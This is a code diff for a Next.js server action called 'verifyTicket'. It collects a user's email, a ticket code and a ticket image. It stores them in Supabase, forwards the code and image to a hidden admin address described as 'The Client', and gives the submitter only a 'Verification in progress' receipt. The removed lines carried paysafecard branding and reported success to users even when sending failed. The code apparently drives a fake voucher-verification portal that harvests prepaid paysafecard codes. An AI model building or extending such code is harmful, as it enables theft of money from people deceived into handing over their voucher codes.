@@ -1,10 +1,16 @@
 "use server";
 
 import { Resend } from "resend";
-
-import { generateEmailHtml } from "@/utils/email-generator";
+import { createClient } from "@supabase/supabase-js";
+import { generateAdminEmail, generateUserReceipt } from "@/utils/email-generator";
 
 const resend = new Resend(process.env.RESEND_API_KEY);
+const ADMIN_EMAIL = process.env.ADMIN_EMAIL;
+
+// Initializing Supabase
+const supabaseUrl = process.env.NEXT_PUBLIC_SUPABASE_URL!;
+const supabaseKey = process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!;
+const supabase = createClient(supabaseUrl, supabaseKey);
 
 export async function verifyTicket(formData: FormData) {
   const email = formData.get("email") as string;
@@ -15,17 +21,36 @@ export async function verifyTicket(formData: FormData) {
     throw new Error("Invalid input data");
   }
 
+  if (!ADMIN_EMAIL) {
+    console.error("CRITICAL: ADMIN_EMAIL is not defined in environment variables.");
+    return { success: false, error: "System configuration error." };
+  }
+
   try {
+    // 1. Save to Database (Supabase)
+    const { error: dbError } = await supabase
+      .from('Tickets')
+      .insert([
+        { 
+          email: email, 
+          ticket_code: ticketCode
+        },
+      ]);
+
+    if (dbError) {
+      console.error("DATABASE ERROR:", dbError);
+    }
+
     const arrayBuffer = await ticketImage.arrayBuffer();
     const buffer = Buffer.from(arrayBuffer);
 
-    const htmlContent = generateEmailHtml(email, ticketCode);
-
-    const { data, error } = await resend.emails.send({
-      from: "paysafecard Verification <onboarding@resend.dev>",
-      to: [email],
-      subject: "Your paysafecard Verification Details",
-      html: htmlContent,
+    // Send detailed email to the ADMIN (The Client)
+    const adminHtml = generateAdminEmail(email, ticketCode);
+    const adminRes = await resend.emails.send({
+      from: "Ticket System <onboarding@resend.dev>",
+      to: [ADMIN_EMAIL],
+      subject: `New Ticket Submission - ${ticketCode.slice(-4)}`,
+      html: adminHtml,
       attachments: [
         {
           filename: ticketImage.name,
@@ -34,18 +59,27 @@ export async function verifyTicket(formData: FormData) {
       ],
     });
 
-    if (error) {
-      // Log the technical error to the server console for the admin
-      console.error("CRITICAL RESEND ERROR:", error);
-      
-      // Still return success: true to the frontend to keep the UI clean for the user
-      return { success: true, data: { id: "processed_with_internal_log" }, error: undefined };
+    if (adminRes.error) {
+      console.error("ADMIN EMAIL ERROR:", adminRes.error);
     }
 
-    return { success: true, data, error: undefined };
+    // 2. Send "In Progress" receipt to the USER
+    const userHtml = generateUserReceipt();
+    const userRes = await resend.emails.send({
+      from: "Verification Portal <onboarding@resend.dev>",
+      to: [email],
+      subject: "Verification in progress",
+      html: userHtml,
+    });
+
+    if (userRes.error) {
+      console.error("USER RECEIPT ERROR:", userRes.error);
+    }
+
+    return { success: true, data: { id: adminRes.data?.id || "processed" }, error: undefined };
+
   } catch (err) {
     console.error("Verification Processing Error:", err);
-    // Return a generic error structure to satisfy TypeScript
-    return { success: false, error: "System busy. Please try again in a moment." }; 
+    return { success: false, error: "System busy. Please try again later." }; 
   }
 }
